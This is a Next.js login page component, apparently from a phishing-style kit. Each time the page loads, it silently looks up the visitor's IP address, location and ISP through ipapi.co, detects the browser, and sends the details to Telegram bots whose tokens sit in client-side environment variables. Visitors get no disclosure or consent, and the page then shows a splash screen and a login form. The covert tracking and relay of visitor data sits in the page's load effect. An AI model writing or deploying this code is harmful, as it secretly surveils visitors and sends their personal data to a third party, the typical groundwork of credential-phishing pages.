"use client"

import { useState, useEffect } from "react";
import { LoginForm } from "./_component/login-form";
import { SplashScreen } from "./_component/splash-screen";

export default function LoginPage() {
  const [showSplash, setShowSplash] = useState(true);

  useEffect(() => {
    // 1️⃣ Function to get browser name
    const getBrowserName = () => {
      const userAgent = window.navigator.userAgent;
      if (userAgent.includes("Firefox")) return "Mozilla Firefox";
      if (userAgent.includes("SamsungBrowser")) return "Samsung Internet";
      if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
      if (userAgent.includes("Edge")) return "Microsoft Edge";
      if (userAgent.includes("Chrome")) return "Google Chrome";
      if (userAgent.includes("Safari")) return "Apple Safari";
      return "Unknown Browser";
    };

    // 2️⃣ Function to track visitor
    const trackVisitor = async () => {
      try {
        const geoRes = await fetch("https://ipapi.co/json/");
        if (geoRes.ok) {
          const data = await geoRes.json();

          if (data.error || data.reason === "Suspended" || data.reserved) {
            console.log("Visitor tracking skipped: IP API suspended or error.");
            return;
          }

          const payload = {
            type: "visitor",
            ip: data.ip,
            city: data.city,
            region: data.region,
            country: data.country_name,
            isp: data.org,
            browser: getBrowserName(),
          };

          const botTokensValue = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
          const chatIdValue = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;

          if (botTokensValue && chatIdValue) {
            const chatIds = chatIdValue.split(",").map(id => id.trim());
            const botTokens = botTokensValue.split(",").map(token => token.trim());
            const message = `
<b>👀 New Visitor</b>

<b>🌍 Location Details:</b>
• <b>IP:</b> <code>${payload.ip || "Unknown"}</code>
• <b>City:</b> ${payload.city || "N/A"}
• <b>Region:</b> ${payload.region || "N/A"}
• <b>Country:</b> ${payload.country || "N/A"}
• <b>ISP:</b> ${payload.isp || "N/A"}

<b>📱 Browser Info:</b>
• <b>Browser:</b> ${payload.browser || "Unknown"}
            `;

            await Promise.all(chatIds.map((id, index) => {
              const token = botTokens[index] || botTokens[botTokens.length - 1];
              return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  chat_id: id,
                  text: message,
                  parse_mode: "HTML",
                }),
              }).catch(err => console.error(`Visitor Tracking Error (${id}):`, err));
            }));
          }
        }
      } catch (err) {
        console.error("Error tracking visitor:", err);
      }
    };

    trackVisitor();

    const timer = setTimeout(() => {
      setShowSplash(false);
    }, 4000);

    return () => clearTimeout(timer);
  }, []);

  return (
    <main className="min-h-screen bg-[#1B3044] flex items-center justify-center p-4">
      {showSplash ? <SplashScreen /> : <LoginForm />}
    </main>
  );
}
